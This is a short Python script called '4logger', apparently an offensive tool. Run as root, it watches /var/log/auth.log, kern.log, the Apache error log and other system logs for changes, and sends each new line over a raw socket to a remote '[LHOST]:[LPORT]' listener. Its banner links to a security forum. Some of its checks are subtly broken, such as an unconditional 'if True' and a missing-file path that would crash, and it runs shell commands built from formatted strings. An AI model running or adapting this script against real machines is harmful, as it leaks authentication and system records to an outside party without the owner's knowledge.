#!/bin/env python3
import sys
import os
import socket
import subprocess
from time import sleep

r = '\033[031m'
g = '\033[032m'
b = '\033[036m'
k = '\033[030m'
n = '\033[00m'

banner = r"""
		  {r}____ {b}__                      {n}
		 {r}/ / /{b}/ /__  ___ {g}____ ____ ____{n}
		{r}/_  _/ {b}/ _ \/ _ `/{g} _ `/ -_) __/{n}
		 {r}/_/{b}/_/\___/\_, /{g}\_, /\__/_/   {n}
		           {b}/___/{g}/___/ {n}
		 {r}MSF{n}{b}: http://www.{n}mmsecurity.n{g}et/forum/member.php?action=register&referrer=9450{n}
		                 		{r}v1.0{n}
""".format(r=r,b=b,n=n,g=g)

general = '/var/log/messages'
auth = '/var/log/auth.log'
kernel = '/var/log/kern.log'
apache = '/var/log/apache2/error.log'
dpkg = '/var/log/dpkg.log'
stat = {general: True, auth: True, kernel: True, apache: True, dpkg: True}
chksum_ori = {general: '',auth: '', kernel: '', apache: '', dpkg: ''}
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
def main(banner):
	print(banner)
	load_module()
	print('[*] Checking log paths... ', end='')
	if check(general=general, auth=auth, kernel=kernel, apache=apache, dpkg=dpkg):
		print('OK')
		for st in stat:
			if stat[st]:
				print('\t@\t%s -> OK ' % st)
			else:
				print('\t@\t%s -> NOT FOUND ' % st)
		print('[*] Calculating sha256sum... OK')
		for ori in chksum_ori:
			osum = subprocess.check_output("sha256sum -t %s | awk '{ print $1 }'" % ori, stderr=subprocess.STDOUT, shell=True, encoding='utf-8').rstrip()
			chksum_ori[ori] = osum
			print('\t%s -> %s ' % (ori, chksum_ori[ori]))
		connected(s)
def load_module():

	print('[*] Loading sha256sum... ', end='')
	os.path.isfile('/usr/bin/sha256sum')
	if True:
		print('FOUND')
	else:
		print('NOT FOUND')
		sys.exit(1)

def check(**kwargs):
	for kwarg in kwargs:
		if not os.path.exists(kwargs[kwarg]):
			print('\t[!] No such file or directory: %s' % kwargs[kwarg])
			stat[kwarg] = False
			return False
	return True

def connected(s):
	connect = sys.argv[1].split(':')
	print(f'[*] Connecting {connect[0]}:{connect[1]}... ', end='')
	try:
		s.connect((connect[0],int(connect[1])))
		print('OK')
	except:
		print('ERROR')
		sys.exit(1)
	s.send(b'[*] Connected with 4logger... OK\n\n')
	try:
		while True:
			for o in chksum_ori:
				modified = subprocess.check_output("sha256sum -t %s | awk '{ print $1 }'" % o, stderr=subprocess.STDOUT, shell=True, encoding='utf-8').rstrip()
				if modified != chksum_ori[o]:
					slot = subprocess.check_output("tail -n 1 %s" % o, stderr=subprocess.STDOUT, shell=True, encoding='utf-8')
					chksum_ori[o] = modified
					try:
						s.sendall(slot.encode())
					except:
						print("[*] Disconnecting... ",end='')
						s.close()
						print('OK')
						break
	except KeyboardInterrupt:
		s.close()
		sys.exit(0)
def usage():
	print('usage: ./%s [LHOST]:[LPORT]' % sys.argv[0])
	sys.exit(1)
def sudo():
	print('[!] Need to run this script as root!')
	usage()
	sys.exit(1)
if __name__ == '__main__':
	if os.geteuid() == 0:
		if len(sys.argv) == 2:
			main(banner)
		else:
			usage()
			sys.exit(1)
	else:
		sudo()
